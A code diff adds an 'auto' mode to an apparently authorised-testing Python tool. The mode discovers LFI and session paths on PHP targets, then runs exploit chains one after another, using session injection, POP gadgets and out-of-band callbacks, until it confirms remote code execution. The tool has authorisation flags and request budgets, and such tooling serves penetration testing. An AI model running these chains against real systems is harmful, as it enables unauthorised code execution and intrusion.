@@ -5,6 +5,7 @@ Modes:
   probe      low-impact frontend -> PHP reachability probes
   prove      explicit, bounded scenario execution (requires --ack-authorised)
   exploit    destructive chain with out-of-band callback verification
+  auto       discover prerequisites and try all viable chains automatically
   report     rebuild findings from stored evidence, no network
   verify     verify evidence artefact hashes
 """
@@ -23,6 +24,7 @@ from typing import Any, Dict, List, Optional
 from urllib.parse import urlsplit
 
 from .assess import assess_all, assess_exploit
+from .discover import run_discovery
 from .evidence import RunStore
 from .exploit import (
     MAX_ATTEMPTS,
@@ -562,6 +564,263 @@ def _run_exploit(args: argparse.Namespace) -> int:
     return rc
 
 
+def _run_auto(args: argparse.Namespace) -> int:
+    if not args.ack_authorised:
+        _abort(
+            "auto requires --ack-authorised: this may send exploit payloads to the target"
+        )
+    target_host = urlsplit(args.target).hostname or ""
+    if not args.allow_remote and _public_host(target_host):
+        _abort(
+            f"refusing to scan public host {target_host!r}; "
+            "use --allow-remote only with explicit written authorisation"
+        )
+    if args.skip_discovery and not args.lfi_path:
+        _abort("--skip-discovery requires --lfi-path")
+
+    outdir = args.out or _default_out("auto", args.target)
+    run_id = os.path.basename(outdir.rstrip("/\\"))
+    store = RunStore(outdir, run_id, args.target, "auto", VERSION)
+    previous_runs = _existing_runs(store)
+    client = _client(args)
+
+    print(f"  target: {args.target}")
+    print(f"  output: {outdir}")
+
+    # --- Inventory + Probe ---
+    print("\n  [1/6] inventory")
+    profile = collect(
+        args.target, client, _inventory_options(args), store=store, run_id=run_id,
+    )
+    print(f"    php: {profile.php_version or 'unknown'}, sapi: {profile.sapi}")
+
+    print("  [2/6] probe")
+    probe_result = run_probe(client, profile, store, status_url=args.status_url, timeout=args.probe_timeout)
+    print(f"    reach: {probe_result.reach}")
+    if probe_result.reach == "BLOCKED":
+        print("    ! frontend blocked multipart; exploit chains will not work")
+        # Still continue — discovery may reveal other info
+
+    # --- Discovery ---
+    discover_result = None
+    if not args.skip_discovery:
+        print("  [3/6] discovery")
+
+        def _log(msg: str) -> None:
+            print(f"    {msg}")
+
+        discover_result = run_discovery(
+            client, profile, store,
+            max_requests=args.max_discover_requests,
+            timeout=args.timeout,
+            log=_log,
+        )
+    else:
+        print("  [3/6] discovery (skipped)")
+
+    # --- Resolve exploit prerequisites ---
+    lfi_path = args.lfi_path
+    session_path = args.session_path or "/tmp/sess_"
+
+    if discover_result and not lfi_path:
+        best = discover_result.best_lfi()
+        if best:
+            parsed = urlsplit(best.url)
+            lfi_path = f"{parsed.path}?{best.param}="
+            print(f"    resolved lfi_path: {lfi_path} (method: {best.method})")
+
+    if discover_result and not args.session_path:
+        if discover_result.session_path:
+            session_path = discover_result.session_path
+            print(f"    resolved session_path: {session_path}")
+
+    # --- Determine which chains to try ---
+    chains_to_try: List[str] = []
+    wrapper_mode = None
+
+    if discover_result and discover_result.wrapper_works:
+        wrapper_mode = discover_result.wrapper_works
+        print(f"\n    ! PHP wrapper execution available ({wrapper_mode}://)")
+        print("      direct code execution possible without session injection")
+
+    if lfi_path:
+        chains_to_try.append("A")
+        if args.callback_port is not None:
+            chains_to_try.append("C")
+    if args.gadget:
+        chains_to_try.append("B")
+
+    if not chains_to_try and not wrapper_mode:
+        print("\n  [!] no viable exploit path found:")
+        if not lfi_path:
+            print("      - no LFI discovered (try --lfi-path if you know one)")
+        if not args.gadget:
+            print("      - no gadget provided for chain B (try --gadget)")
+        if not args.callback_port:
+            print("      - no callback port (add --callback-port for chain C)")
+
+        environment = {
+            "kind": args.environment_kind,
+            "mode": "auto",
+            "probe": probe_result.to_dict(),
+            "discovery": discover_result.to_dict() if discover_result else {},
+            "chains_attempted": [],
+            "started_at": utcnow(),
+        }
+        case = _case(run_id, profile, store.load_evidence(), previous_runs, "auto", environment)
+        findings = assess_all(case)
+        return _finalise(store, case, findings, outdir, args.json)
+
+    # --- Execute chains ---
+    all_runs: List[ScenarioRun] = list(previous_runs)
+    chain_results: List[Dict[str, Any]] = []
+    rce_confirmed = False
+    best_exploit_result = None
+
+    started_at = time.monotonic()
+
+    for chain in chains_to_try:
+        if rce_confirmed:
+            break
+        elapsed = time.monotonic() - started_at
+        if elapsed > args.max_seconds:
+            print(f"\n  [!] wall-clock budget exhausted ({elapsed:.0f}s)")
+            break
+
+        step = 4 + chains_to_try.index(chain)
+        total = 3 + len(chains_to_try) + 1
+        print(f"\n  [{step}/{total}] exploit chain {chain}")
+
+        budget = ExploitBudget(
+            max_requests=args.max_exploit_requests,
+            max_bytes=args.max_bytes,
+            max_seconds=max(10.0, args.max_seconds - elapsed),
+            started_at=time.monotonic(),
+        )
+
+        options = ExploitOptions(
+            chain=chain,
+            lfi_path=lfi_path if chain in ("A", "C") else None,
+            session_path=session_path,
+            inject_path="/index.php",
+            command=args.command,
+            exec_func=args.exec_func,
+            gadget=args.gadget if chain == "B" else None,
+            canary_nonce=args.canary_nonce if chain == "B" else None,
+            callback_port=args.callback_port,
+            callback_bind=args.callback_bind,
+            callback_ip=args.callback_ip,
+            callback_expect=list(args.callback_expect or []),
+            attempts=args.attempts,
+            race_delay=args.race_delay,
+            timeout=args.timeout,
+            acknowledge_authorised=True,
+            environment_kind=args.environment_kind,
+            insecure=args.insecure,
+            ca_file=args.ca_file,
+            extra_headers=_parse_headers(args.header),
+            host_header=args.host_header,
+            max_body=args.max_body,
+            health_url=args.health_url,
+            budget=budget,
+        )
+
+        exploit_result = run_exploit(client, profile, store, options)
+
+        chain_entry = {
+            "chain": chain,
+            "rce_confirmed": exploit_result.rce_confirmed,
+            "callback_received": exploit_result.callback_received,
+            "response_markers_seen": exploit_result.response_markers_seen,
+            "errors": list(exploit_result.errors),
+            "attempts": exploit_result.attempts,
+            "requests": budget.requests,
+        }
+        chain_results.append(chain_entry)
+
+        if exploit_result.scenario_run:
+            telemetry_refs = _ingest_telemetry(
+                store, list(args.telemetry or []),
+                args.telemetry_source,
+                exploit_result.scenario_id,
+                bool(args.synthetic_fixture),
+            )
+            if telemetry_refs:
+                exploit_result.scenario_run.telemetry_refs.extend(telemetry_refs)
+            all_runs.append(exploit_result.scenario_run)
+
+        if exploit_result.rce_confirmed:
+            rce_confirmed = True
+            best_exploit_result = exploit_result
+            print(f"    [RCE CONFIRMED] chain {chain}")
+            if exploit_result.command_output:
+                for line in exploit_result.command_output.strip().splitlines():
+                    print(f"      | {line}")
+        elif exploit_result.command_output:
+            print(f"    [UNVERIFIED OUTPUT] chain {chain}")
+            if not best_exploit_result:
+                best_exploit_result = exploit_result
+        else:
+            reasons = exploit_result.errors or ["no output"]
+            print(f"    chain {chain}: {reasons[0]}")
+
+    # --- Finalize ---
+    step_final = 4 + len(chains_to_try)
+    total_final = step_final
+    print(f"\n  [{step_final}/{total_final}] report")
+
+    environment = {
+        "kind": args.environment_kind,
+        "mode": "auto",
+        "probe": probe_result.to_dict(),
+        "discovery": discover_result.to_dict() if discover_result else {},
+        "chains_attempted": chain_results,
+        "started_at": utcnow(),
+        "rce_confirmed": rce_confirmed,
+    }
+    if best_exploit_result:
+        environment["exploit"] = best_exploit_result.to_dict()
+        environment["degraded"] = best_exploit_result.degraded
+
+    case = _case(run_id, profile, store.load_evidence(), all_runs, "auto", environment)
+    findings = assess_all(case)
+
+    exploit_assessment: Dict[str, Any] = {}
+    if best_exploit_result:
+        exploit_assessment = assess_exploit(case)
+        case.environment["exploit_assessment"] = exploit_assessment
+
+    rc = _finalise(
+        store, case, findings, outdir, args.json,
+        exploit_result=best_exploit_result,
+        exploit_assessment=exploit_assessment or None,
+        exploit_confirmed=rce_confirmed,
+    )
+
+    if not args.json:
+        print(f"\n  === AUTO SUMMARY ===")
+        print(f"  target        : {args.target}")
+        if discover_result:
+            print(f"  phpinfo       : {'found' if discover_result.phpinfo.found else 'not found'}")
+            print(f"  LFI           : {lfi_path or 'not found'}")
+            print(f"  session path  : {session_path}")
+            if discover_result.framework:
+                print(f"  framework     : {discover_result.framework}")
+            if discover_result.wrapper_works:
+                print(f"  wrapper       : {discover_result.wrapper_works}://")
+        print(f"  chains tried  : {', '.join(c['chain'] for c in chain_results) or 'none'}")
+        if rce_confirmed:
+            print(f"  result        : RCE CONFIRMED")
+            if best_exploit_result and best_exploit_result.command_output:
+                print(f"  command output :")
+                for line in best_exploit_result.command_output.strip().splitlines():
+                    print(f"    | {line}")
+        else:
+            print(f"  result        : no confirmed RCE")
+        print(f"  evidence      : {outdir}")
+
+    return rc
+
 
 def _run_report(args: argparse.Namespace) -> int:
     source = os.path.abspath(args.evidence_dir)
@@ -773,6 +1032,49 @@ examples:
     exploit.add_argument("--allow-remote", action="store_true",
                          help="allow exploit payloads against a globally routable host")
 
+    auto = sub.add_parser("auto", help="discover prerequisites and try all viable chains")
+    auto.add_argument("target")
+    common(auto)
+    auto.add_argument("--ack-authorised", action="store_true",
+                      help="confirm written authorisation for exploit execution")
+    auto.add_argument("--allow-remote", action="store_true",
+                      help="allow exploit payloads against a globally routable host")
+    auto.add_argument("--command", default="id", help="command to execute on target")
+    auto.add_argument("--exec-func", default=None,
+                      choices=("system", "passthru", "shell_exec", "exec", "popen", "proc_open"),
+                      help="preferred PHP execution function")
+    auto.add_argument("--callback-port", type=int, default=None,
+                      help="callback listener port (strongly recommended; omit to skip callback)")
+    auto.add_argument("--callback-bind", default="0.0.0.0",
+                      help="callback listener bind address")
+    auto.add_argument("--callback-ip",
+                      help="IP the target should call back to (auto-detected if omitted)")
+    auto.add_argument("--callback-expect", action="append",
+                      help="source IP the callback is expected from (repeatable)")
+    auto.add_argument("--attempts", type=_attempts_type, default=5,
+                      help=f"number of exploit attempts per chain (1..{MAX_ATTEMPTS})")
+    auto.add_argument("--race-delay", type=float, default=0.05,
+                      help="upload-progress stall delay for chain A")
+    auto.add_argument("--max-discover-requests", type=int, default=120,
+                      help="request budget for the discovery phase")
+    auto.add_argument("--max-exploit-requests", type=int, default=60,
+                      help="request budget per exploit chain")
+    auto.add_argument("--max-bytes", type=int, default=64 * 1024 * 1024,
+                      help="sent+received byte budget for exploit chains")
+    auto.add_argument("--max-seconds", type=float, default=300.0,
+                      help="wall-clock budget for the entire auto run")
+    auto.add_argument("--health-url", help="health check URL (default: target base URL)")
+    auto.add_argument("--lfi-path",
+                      help="skip LFI discovery and use this path directly")
+    auto.add_argument("--session-path",
+                      help="skip session path discovery and use this path directly")
+    auto.add_argument("--gadget",
+                      help="serialised POP chain for chain B (optional)")
+    auto.add_argument("--canary-nonce",
+                      help="chain B only: nonce embedded in the operator's gadget")
+    auto.add_argument("--skip-discovery", action="store_true",
+                      help="skip discovery phases; requires --lfi-path")
+
     report = sub.add_parser("report", help="rebuild findings from stored evidence (no network)")
     report.add_argument("evidence_dir")
     report.add_argument("--out", help="report output directory")
@@ -797,6 +1099,8 @@ def main(argv: Optional[List[str]] = None) -> int:
             return _run_prove(args)
         if args.mode == "exploit":
             return _run_exploit(args)
+        if args.mode == "auto":
+            return _run_auto(args)
         if args.mode == "report":
             return _run_report(args)
         if args.mode == "verify":
